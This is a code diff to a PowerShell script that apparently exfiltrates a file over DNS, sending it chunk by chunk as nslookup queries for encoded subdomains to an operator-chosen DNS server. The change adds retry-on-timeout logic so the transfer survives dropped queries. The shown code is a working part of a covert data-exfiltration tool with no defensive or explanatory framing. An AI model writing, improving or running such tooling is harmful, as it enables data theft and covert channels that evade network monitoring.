@@ -115,8 +115,26 @@ while ($chunk_id -lt $nbChunks) {
     # Determine if -UseTcp switch is present
     $queryType = if ($UseTcp.IsPresent) { "-vc" } else { "" }
     
-    # Send DNS query using nslookup
-    nslookup $queryType -type=a $subdomain $DnsServerIp > $null 2>$null
+    # Retry logic for DNS query
+    $max_retries = 5
+    $retry_count = 0
+    $success = $false
+
+    while ($retry_count -lt $max_retries -and -not $success) {
+        $output = nslookup $queryType -type=a $subdomain $DnsServerIp 2>&1
+        if (-not $output.Contains("DNS request timed out.")) {
+            $success = $true
+        } else {
+            $retry_count++
+            Write-Host "[*] Timeout occurred, retrying $retry_count/$max_retries..."
+            Start-Sleep -Seconds 3
+        }
+    }
+
+    if (-not $success) {
+        Write-Host "[!] Failed to send DNS query after multiple retries."
+        exit 1
+    }
 
     Write-Progress -Activity "Sending file in Progress" -Status "$chunk_id/$nbChunks chunks Complete:" -PercentComplete '100'
 
